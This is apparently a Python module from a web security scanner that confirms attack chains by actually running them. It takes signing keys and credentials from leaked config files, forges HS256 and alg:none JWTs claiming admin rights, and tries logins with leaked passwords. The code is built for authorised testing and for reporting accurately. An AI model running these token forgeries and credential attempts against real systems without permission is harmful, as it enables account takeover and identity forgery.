"""Chain walking — demonstrating a chain instead of inferring one.

`chains.py` escalates a finding's severity when its output satisfies another finding's
assumption. That escalation is *inferred* from a capability model, and every escalated
finding says so. This module removes the inference where it can.

A walked chain is a transcript of requests that were actually sent and responses that
were actually received, ending in an observed effect. Three outcomes, and only the first
earns the escalated severity:

  DEMONSTRATED      — every step was executed and the final effect was observed.
  NOT_DEMONSTRATED  — steps were executed and the chain broke. The escalation is
                      WITHDRAWN and the finding reverts to its standalone severity.
  CANNOT_ATTEMPT    — a precondition is missing (no secret of the right kind, no endpoint
                      named). The escalation stays labelled inferred.

The second outcome is the reason this module exists. An inferred escalation that fails
when attempted is a false positive in a report, and it is worse than an ordinary false
positive because it arrives wearing a Critical label and a plausible narrative.
"""

import base64
import hashlib
import hmac
import json
import re
import urllib.parse

# Variable names whose value is plausibly a JWT signing key.
SIGNING_HINT = re.compile(r"(JWT|SIGN|SECRET|APP_SECRET|SESSION_SECRET|TOKEN_SECRET)", re.I)
# Assignment lines in a leaked config body.
ASSIGN = re.compile(r"^\s*([A-Za-z_][A-Za-z0-9_]*)\s*[:=]\s*[\"']?([^\"'\r\n]+?)[\"']?\s*$")


def _b64url(raw):
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def _extract(body):
    """Pull name -> value assignments out of a leaked config body."""
    out = {}
    for line in (body or "").splitlines():
        if line.lstrip().startswith("#"):
            continue
        m = ASSIGN.match(line)
        if m:
            out[m.group(1)] = m.group(2).strip()
    return out


def sign_hs256(claims, secret):
    """Forge a properly-signed HS256 token. No library, because the point is that the
    secret alone is sufficient."""
    hdr = _b64url(json.dumps({"typ": "JWT", "alg": "HS256"}, separators=(",", ":")).encode())
    pl = _b64url(json.dumps(claims, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{hdr}.{pl}".encode(), hashlib.sha256).digest()
    return f"{hdr}.{pl}.{_b64url(sig)}"


def _leaked_path(finding):
    """Which path did the exposure finding actually retrieve?"""
    paths = finding.get("leaked_paths") or []
    if paths:
        return paths[0]
    m = re.search(r"(/[^\s;(]+)", finding.get("evidence", ""))
    return m.group(1) if m else None


def walk_secret_to_identity(h, exposure, endpoint, claims=None):
    """Leaked signing key -> forged valid token -> endpoint accepts it.

    This is the strongest form of the exposure finding: not "a file was reachable" but
    "the file handed over the key that mints valid identities, and here is a minted
    identity being accepted."
    """
    claims = claims or {"uid": 999, "role": "admin", "sub": "chainwalk"}
    steps = []

    path = _leaked_path(exposure)
    if not path:
        return {"verdict": "CANNOT_ATTEMPT", "steps": steps,
                "reason": "the exposure finding does not record which path was retrieved"}
    r = h.req(path)
    steps.append({"step": f"re-fetch the leaked file {path}", "status": r["code"],
                  "detail": f"{len(r['body'])} bytes"})
    if r["code"] != 200 or not r["body"]:
        return {"verdict": "NOT_DEMONSTRATED", "steps": steps,
                "reason": f"the file is no longer served (HTTP {r['code']})"}

    kv = _extract(r["body"])
    candidates = {k: v for k, v in kv.items() if SIGNING_HINT.search(k) and len(v) >= 8}
    steps.append({"step": "extract candidate signing keys",
                  "detail": f"{list(candidates) or 'none'}"})
    if not candidates:
        return {"verdict": "CANNOT_ATTEMPT", "steps": steps,
                "reason": "the leaked body holds no signing-key-shaped value; the exposure "
                          "may still be serious but this chain does not apply"}

    accepted, token_used = None, None
    for name, secret in candidates.items():
        tok = sign_hs256(claims, secret)
        rr = h.req(endpoint, headers={"Authorization": f"Bearer {tok}"})
        steps.append({"step": f"present a token signed with {name}", "status": rr["code"],
                      "detail": f"response body {len(rr.get('body') or '')} bytes"})
        if rr["code"] == 200:
            accepted, token_used = rr, (name, secret, tok)
            break

    if not accepted:
        return {"verdict": "NOT_DEMONSTRATED", "steps": steps,
                "reason": "no leaked key produced a token the endpoint accepted. The "
                          "endpoint may use a different key, or verify none at all "
                          "(which the jwt-none probe covers separately)."}

    name, secret, tok = token_used
    body = accepted["body"]
    # Compare against a space-stripped haystack, so the needle must be stripped too.
    # The first version looked for '"granted": true' inside a string whose spaces had
    # already been removed, so the primary signal never fired and only the role fallback
    # kept the live run passing.
    flat = body.lower().replace(" ", "").replace("\n", "")
    granted = ('"granted":true' in flat
               or claims.get("role", "") and str(claims.get("role")) in body)
    steps.append({"step": "verify the endpoint granted the forged identity",
                  "detail": f"granted={granted}; claims echoed for role={claims.get('role')}"})
    if not granted:
        return {"verdict": "NOT_DEMONSTRATED", "steps": steps,
                "reason": "the endpoint returned 200 but did not grant the forged claims"}

    return {
        "verdict": "DEMONSTRATED", "steps": steps,
        "summary": (f"The signing key `{name}` was read from the exposed file and used to "
                    f"mint a validly-signed HS256 token carrying role={claims.get('role')}. "
                    f"The endpoint accepted it. The exposure is not information disclosure "
                    f"— it is identity forgery."),
        "evidence": f"token signed with leaked {name} accepted at {endpoint}: HTTP "
                    f"{accepted['code']}, response body {len(body)} bytes",
        "secret_name": name,
        "note": "The secret value is deliberately not reproduced here. It is in the "
                "engagement evidence if it is needed for remediation proof.",
    }


def walk_credentials_to_session(h, exposure, login_path, user_field="username",
                                pass_field="password", body_is_json=True):
    """Leaked credentials -> authenticated session."""
    steps = []
    path = _leaked_path(exposure)
    if not path:
        return {"verdict": "CANNOT_ATTEMPT", "steps": steps,
                "reason": "the exposure finding does not record which path was retrieved"}
    r = h.req(path)
    steps.append({"step": f"re-fetch the leaked file {path}", "status": r["code"]})
    if r["code"] != 200:
        return {"verdict": "NOT_DEMONSTRATED", "steps": steps,
                "reason": f"the file is no longer served (HTTP {r['code']})"}

    kv = _extract(r["body"])
    pairs = [(k, v) for k, v in kv.items()
             if re.search(r"(USER|LOGIN|NAME|EMAIL)", k, re.I)
             and not re.search(r"(HOST|URL|DOMAIN|AGENT)", k, re.I)]
    creds = [(k, v) for k, v in kv.items() if re.search(r"(PASS|PWD|SECRET)", k, re.I)]
    steps.append({"step": "extract credential-shaped pairs",
                  "detail": f"{len(pairs)} user-like, {len(creds)} secret-like"})
    if not creds:
        return {"verdict": "CANNOT_ATTEMPT", "steps": steps,
                "reason": "no password-shaped value in the leaked body"}

    for uname, _ in (pairs or [("admin", None)]):
        for pname, pval in creds:
            data = {user_field: uname, pass_field: pval}
            payload = json.dumps(data) if body_is_json else urllib.parse.urlencode(data)
            hdr = {"Content-Type": "application/json" if body_is_json
                   else "application/x-www-form-urlencoded"}
            rr = h.req(login_path, "POST", payload, headers=hdr)
            steps.append({"step": f"attempt login as {uname} with {pname}",
                          "status": rr["code"],
                          "detail": f"response body {len(rr.get('body') or '')} bytes; "
                                    f"Set-Cookie={'present' if rr.get('headers', {}).get('Set-Cookie') else 'absent'}"})
            if rr["code"] == 200 and rr["headers"].get("Set-Cookie"):
                return {"verdict": "DEMONSTRATED", "steps": steps,
                        "summary": f"Credentials read from the exposed file authenticated "
                                   f"to {login_path} and returned a session cookie.",
                        "evidence": f"POST {login_path} as {uname} -> HTTP 200 with "
                                    f"Set-Cookie present"}
    return {"verdict": "NOT_DEMONSTRATED", "steps": steps,
            "reason": "no leaked credential pair authenticated. They may be for a different "
                      "system, which is still a finding — but not this chain."}


def walk_alg_none_to_admin(h, finding, endpoint, claims=None,
                           protected=None):
    """alg:none token -> an endpoint that rejected us now accepts us as admin.

    This is the walk that makes the identity precondition real. `chains.REQUIRES` says
    that idor, race and the four business-logic classes all *assume* an authenticated
    identity, and their severity is downgraded when that identity was never demonstrated.
    A jwt-none finding grants identity, but "grants" is an inference — this function turns
    it into an observation.

    The baseline is not optional. If the endpoint accepts an anonymous request too, then
    the forged token proved nothing, and reporting DEMONSTRATED would be exactly the kind
    of manufactured chain this module exists to avoid. So: refuse first, then accept.
    """
    claims = claims or {"uid": 999, "role": "admin", "sub": "chainwalk"}
    steps = []

    probe_path = protected or endpoint

    # 1. Baseline: the endpoint must refuse us before the walk means anything.
    base = h.req(probe_path)
    steps.append({"step": f"call {probe_path} with no credentials (baseline)",
                  "status": base["code"],
                  "detail": "must be refused, or the forged token proves nothing"})
    if base["code"] == 200:
        return {"verdict": "NOT_DEMONSTRATED", "steps": steps,
                "reason": f"{probe_path} returned HTTP 200 with no credentials at all, so "
                          f"an accepted forged token would not demonstrate privilege "
                          f"escalation — the endpoint is simply unauthenticated"}

    # 2. Forge an unsigned token claiming admin.
    hdr = _b64url(json.dumps({"typ": "JWT", "alg": "none"},
                             separators=(",", ":")).encode())
    pl = _b64url(json.dumps(claims, separators=(",", ":")).encode())
    token = f"{hdr}.{pl}."
    steps.append({"step": "forge an alg:none token claiming role=admin",
                  "detail": f"claims={claims}"})

    # 3. Present it.
    r = h.req(probe_path, headers={"Authorization": f"Bearer {token}"})
    steps.append({"step": f"call {probe_path} with the forged token", "status": r["code"],
                  "detail": f"granted role={claims.get('role')}; response body "
                            f"{len(r.get('body') or '')} bytes"})
    if r["code"] != 200:
        return {"verdict": "NOT_DEMONSTRATED", "steps": steps,
                "reason": f"the endpoint refused the forged token (HTTP {r['code']}) — the "
                          f"signature IS checked here, so the jwt-none finding does not "
                          f"escalate through this path"}

    return {"verdict": "DEMONSTRATED", "steps": steps,
            "capability": "identity",
            "grants_role": claims.get("role"),
            "endpoint": probe_path,
            "token": token,
            "reason": f"{probe_path} refused an anonymous request (HTTP {base['code']}) and "
                      f"accepted an unsigned alg:none token claiming role="
                      f"{claims.get('role')} (HTTP {r['code']}). The identity that "
                      f"idor/race/business-logic findings assume is now demonstrated, not "
                      f"assumed."}


def escalation_withdrawn(result):
    """Derived from the verdict, never stored separately.

    An earlier version carried an `escalation_withdrawn` flag on some NOT_DEMONSTRATED
    branches and not others, so the report could have said both "the chain failed" and
    "severity escalated" about the same finding. One source of truth.
    """
    return result.get("verdict") == "NOT_DEMONSTRATED"


def render(results):
    L = ["## Walked chains", ""]
    if not results:
        return "## Walked chains\n\n_No chain was attempted._"
    for r in results:
        v = r["verdict"]
        mark = {"DEMONSTRATED": "DEMONSTRATED",
                "NOT_DEMONSTRATED": "NOT DEMONSTRATED — escalation withdrawn",
                "CANNOT_ATTEMPT": "CANNOT ATTEMPT — escalation remains inferred"}[v]
        L.append(f"### {r.get('name', 'chain')} — {mark}")
        L.append("")
        for s in r.get("steps", []):
            code = f" [HTTP {s['status']}]" if s.get("status") else ""
            L.append(f"- {s['step']}{code}" + (f" — {s['detail']}" if s.get("detail") else ""))
        if r.get("summary"):
            L.append("")
            L.append(f"**{r['summary']}**")
        if r.get("reason"):
            L.append("")
            L.append(f"_{r['reason']}_")
        if r.get("evidence"):
            L.append("")
            L.append(f"Evidence: `{r['evidence']}`")
        if r.get("note"):
            L.append("")
            L.append(f"> {r['note']}")
        L.append("")
    return "\n".join(L)
